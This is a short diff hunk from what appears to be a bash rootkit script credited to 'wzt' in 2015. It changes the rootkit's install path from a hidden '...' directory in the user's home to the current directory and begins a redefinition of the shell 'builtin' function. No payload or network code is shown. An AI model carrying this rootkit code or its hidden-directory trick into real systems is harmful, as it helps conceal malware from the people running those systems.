@@ -4,7 +4,7 @@
 # by wzt 2015
 #
 
-BR_ROOTKIT_PATH="/home/$USER/.../"
+BR_ROOTKIT_PATH="$(pwd)//"
 
 builtin()
 {
